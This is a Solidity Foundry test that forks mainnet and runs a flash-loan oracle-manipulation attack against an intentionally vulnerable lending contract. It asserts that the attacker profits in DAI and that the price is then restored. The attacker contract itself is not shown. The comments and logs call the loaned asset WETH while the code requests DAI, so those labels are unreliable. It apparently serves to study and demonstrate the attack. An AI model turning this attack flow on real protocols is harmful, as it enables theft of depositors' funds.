// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/v8/VulnerableLending.sol";
import "../../src/v8/OracleAttacker.sol";
import "../../src/interfaces/IERC20.sol";

contract OracleManipulationTest is Test {
    VulnerableLending public lending;
    OracleAttacker public attacker;

    // Mainnet addresses (for forking)
    address constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WETH_DAI_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address constant AAVE_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    address public attackerEOA = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet at a specific block for reproducibility
        console.log("\n=== SETUP (Mainnet Fork) ===");
        vm.createSelectFork(vm.envString("INFURA_URL"), 23_000_000);
        console.log("Fork block:", block.number);

        // Check pair reserves
        IUniswapV2Pair pair = IUniswapV2Pair(WETH_DAI_PAIR);
        console.log("Token0:", pair.token0());
        console.log("Token1:", pair.token1());

        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        console.log("Pair reserve0:", uint256(reserve0) / 1e18);
        console.log("Pair reserve1:", uint256(reserve1) / 1e18);

        // Deploy lending protocol
        lending = new VulnerableLending(WETH_DAI_PAIR, WETH, DAI);

        // Fund lending with DAI (for borrowing)
        deal(DAI, address(lending), 1_000_000 ether); // 1M DAI
        console.log("Lending funded with:", IERC20(DAI).balanceOf(address(lending)) / 1e18, "DAI");

        // Check initial price
        uint256 initialPrice = lending.getETHPrice();
        console.log("Initial ETH price:", initialPrice / 1e18, "DAI per ETH\n");

        // Fund attacker
        vm.deal(attackerEOA, 100 ether);

        // Deploy attacker contract
        vm.prank(attackerEOA);
        attacker =
            new OracleAttacker(payable(address(lending)), UNISWAP_ROUTER, AAVE_POOL, WETH, DAI);

        // Fund attacker contract with ETH for collateral
        vm.deal(address(attacker), 20 ether);
        console.log("Attacker funded with:", address(attacker).balance / 1e18, "ETH");
    }

    function testFlashLoanOracleManipulation() public {
        console.log("\n=== FLASH LOAN ORACLE MANIPULATION ===\n");
        console.log("Attacker uses Aave flash loan for massive manipulation");
        console.log("This is how real attacks work in production\n");

        // Record initial state
        uint256 priceInitial = lending.getETHPrice();
        uint256 attackerDAIBefore = IERC20(DAI).balanceOf(address(attacker));

        console.log("\n[STEP 0] Initial state");
        console.log("  ETH price:", priceInitial / 1e18, "DAI");
        console.log("  Attacker DAI balance:", attackerDAIBefore / 1e18);

        // Prepare flash loan parameters
        uint256 flashLoanAmount = 500_000 ether; // Borrow 500,000 WETH
        uint256 collateralToDeposit = 10 ether; // Deposit 10 ETH as collateral

        console.log("\nFlash loan parameters:");
        console.log("  Flash loan amount:", flashLoanAmount / 1e18, "WETH");
        console.log("  Collateral to deposit:", collateralToDeposit / 1e18, "ETH");

        // Setup flash loan call
        address[] memory assets = new address[](1);
        assets[0] = DAI;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashLoanAmount;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // 0 = no debt, must repay in same transaction

        bytes memory params = abi.encode(collateralToDeposit);

        vm.prank(attackerEOA);
        ILendingPool(AAVE_POOL)
            .flashLoan(
                address(attacker),
                assets,
                amounts,
                modes,
                address(attacker),
                params,
                0 // referral code
            );

        // Record final state
        uint256 attackerDAIAfter = IERC20(DAI).balanceOf(address(attacker));
        uint256 daiProfit = attackerDAIAfter - attackerDAIBefore;
        uint256 priceFinal = lending.getETHPrice();

        console.log("\n=== FLASH LOAN ATTACK RESULTS ===");
        console.log("DAI profit:", daiProfit / 1e18);
        console.log("Final ETH price:", priceFinal / 1e18, "DAI per ETH");

        // Verify attack succeeded
        assertGt(daiProfit, 0, "Should have stolen DAI");
        assertApproxEqRel(priceFinal, priceInitial, 0.01e18, "Price should be ~restored");

        console.log("Flash loan attack succeeded!");
        console.log("Attacker borrowed", flashLoanAmount / 1e18, "WETH for free (flash loan)");
        console.log("Used it to manipulate price and steal", daiProfit / 1e18, "DAI\n");

        // Assertions
        assertGt(daiProfit, 0, "Attack should be profitable");
        assertApproxEqRel(priceFinal, priceInitial, 0.02e18, "Price should be mostly restored");
    }
}
